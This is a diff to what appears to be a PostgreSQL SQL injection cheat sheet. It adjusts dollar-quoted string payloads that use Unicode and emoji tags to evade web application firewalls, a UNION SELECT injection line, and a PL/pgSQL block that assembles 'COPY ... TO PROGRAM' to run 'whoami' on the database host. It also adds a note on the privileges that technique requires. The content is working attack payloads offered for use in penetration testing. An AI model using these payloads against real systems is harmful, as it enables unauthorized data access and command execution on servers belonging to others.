@@ -135,15 +135,17 @@ SELECT * FROM users WHERE username = $x$admin$x$
 -- Unicode tags (WAFs often don't expect these)
 SELECT * FROM users WHERE username = $α$admin$α$
 SELECT * FROM users WHERE username = $日$admin$日$
-SELECT * FROM users WHERE username = $💀$admin$💀$  -- PG12+
+SELECT * FROM users WHERE username = $💀$admin$💀$
 
 -- UNION with unicode tags
 0 UNION SELECT 1,$α$test$α$,$β$email$β$,$γ$role$γ$--
 ```
 
-**Tag Rules** (tags follow unquoted identifier rules per PostgreSQL docs):
+**Tag Rules** (tags follow unquoted identifier rules):
 
-- Tags can contain letters (including Unicode letters like α, 日, 💀), digits, and underscores
+- Official docs: tags can contain letters (including non-Latin), digits, and underscores
+- In practice: PostgreSQL's scanner accepts any UTF-8 multi-byte character (bytes 128-255), which includes emojis (💀, ☠) and all non-ASCII Unicode
+- ASCII punctuation (@, #, !, etc.) is **not valid** - only bytes 0-127 that are letters/digits/underscore
 - Tags **cannot** start with a digit (`$1tag$` fails)
 - Tags **cannot** contain dollar signs (the `$` delimiters are separate)
 - Tags are case-sensitive (`$Tag$` ≠ `$tag$`)
@@ -289,6 +291,8 @@ BEGIN
     EXECUTE c || ' (SELECT 1) TO ' || p || ' ''whoami''';
 END $x$;
 ```
+
+**Note:** `COPY ... TO PROGRAM` requires superuser privileges or membership in `pg_execute_server_program` (PostgreSQL 11+). This technique only works on misconfigured instances or when the database connection already has elevated privileges — standard application database users cannot execute it.
 
 **Helper to convert string to CHR():**
 
